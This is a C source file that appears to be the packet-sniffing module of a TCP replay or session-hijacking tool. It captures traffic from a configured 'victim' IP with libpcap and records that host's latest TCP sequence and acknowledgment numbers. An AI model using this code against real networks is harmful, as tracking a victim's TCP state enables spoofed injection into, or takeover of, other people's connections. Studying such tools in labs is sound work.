#include "packet_sniffing.h"
#include <stdio.h>
#include <string.h>

static pcap_t *pcap_handle = NULL;
uint32_t latest_victim_seq = 0;
uint32_t latest_victim_ack = 0;

int init_sniffer(const char *interface) {
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_handle = pcap_open_live(interface, 65535, 1, 1, errbuf);
    if (pcap_handle == NULL) {
        fprintf(stderr, "ERROR: Couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }
    return 0;
}

void close_sniffer() {
    if (pcap_handle != NULL) {
        pcap_close(pcap_handle);
        pcap_handle = NULL;
    }
}

const u_char *receive_victim_packet(struct config_data *cfg, struct pcap_pkthdr *header) {
    const u_char *packet;

    while (1) {
        packet = pcap_next(pcap_handle, header);
        if (packet == NULL) continue;

        struct eth_hdr *ethhdr = (struct eth_hdr *)packet;
        if (ntohs(ethhdr->eth_type) != ETH_TYPE_IP) continue;

        struct ip_hdr *iphdr = (struct ip_hdr *)(packet + ETH_HDR_LEN);
        if (iphdr->ip_p != IP_PROTO_TCP) continue;

        if (memcmp(&iphdr->ip_src, &cfg->replay_victim_ip, sizeof(ip_addr_t)) == 0) {
            struct tcp_hdr *tcphdr = (struct tcp_hdr *)((u_char *)iphdr + (iphdr->ip_hl * 4));
            
            latest_victim_seq = ntohl(tcphdr->th_seq);
            latest_victim_ack = ntohl(tcphdr->th_ack);

            printf("Sniffed victim packet: seq = %u, ack = %u\n", latest_victim_seq, latest_victim_ack);

            return packet;
        }
    }
}

